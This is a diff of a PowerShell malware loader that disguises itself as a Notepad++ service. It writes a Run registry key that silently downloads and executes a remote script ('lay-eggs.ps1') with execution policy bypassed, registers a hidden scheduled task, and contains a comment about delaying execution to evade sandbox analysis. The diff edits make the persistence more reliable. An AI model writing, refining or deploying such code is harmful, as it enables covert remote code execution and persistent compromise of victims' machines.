@@ -63,15 +63,21 @@ Invoke-RestMethod -Uri "http://192.168.1.102:8080/npp-service" -OutFile "C:\Prog
 # Establish Persistence
 Log-Msg "Setting Persistence..."
 $runKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
-# Use double quotes for the argument in the registry string to ensure Windows handles it correctly
-New-ItemProperty -Path $runKey -Name "NotepaddPlusPlus" -Value "`"powershell -exec bypass -WindowStyle Hidden -Command Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://192.168.1.102:8080/lay-eggs.ps1')`"" -PropertyType String -Force
+# Use call operator (&) and proper escaping for reliability
+# This ensures PowerShell runs hidden and downloads/executes the payload
+try{
+    New-ItemProperty -Path $runKey -Name "NotepaddPlusPlus" -Value "`"powershell -exec bypass -WindowStyle Hidden -Command Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://192.168.1.102:8080/lay-eggs.ps1')`"" -PropertyType String -Force
+} catch {
+    Log-Msg "Failed to set Run key: $_"
+}
 
 # 3. FIX: Simplified Task Action to call Executable directly
 # The script defaults to localhost:8080 if env var is missing, so we don't need the complex env wrapper
 $action = New-ScheduledTaskAction -Execute "C:\ProgramData\npp\notepad-service.exe" -WorkingDirectory "C:\ProgramData\npp"
-$trigger = New-ScheduledTaskTrigger -AtStartup
+# $trigger = New-ScheduledTaskTrigger -AtStartup
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10) # Initial delay to ensure system stability
 $trigger.Delay = "PT30S" # Delay execution by 30 seconds after startup to evade sandbox analysis
-$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+$principal = New-ScheduledTaskPrincipal -UserId $env:UserName -LogonType Interactive -RunLevel Highest
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero) -RunOnlyIfNetworkAvailable
 
 # Register (Force update if exists)
